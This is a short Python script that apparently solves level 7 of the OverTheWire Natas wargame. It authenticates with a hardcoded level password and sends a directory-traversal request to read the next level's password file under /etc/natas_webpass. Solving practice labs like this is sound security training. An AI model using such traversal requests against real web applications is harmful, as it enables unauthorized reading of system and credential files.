#!/usr/bin/env python3
import requests
import re
from html import unescape

with open('natas7.html', 'w+') as out:
    username = 'natas7'
    password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'
    
    s = requests.session()

    url = 'http://%s.natas.labs.overthewire.org' % username 

    r = s.get(url+'/index.php?page=../../../../etc/natas_webpass/natas8', auth = (username, password))
    content = r.text
    
    # out.write(content)
    out.write(re.findall('<br>\n(.*)\n\n<!--', content)[0])


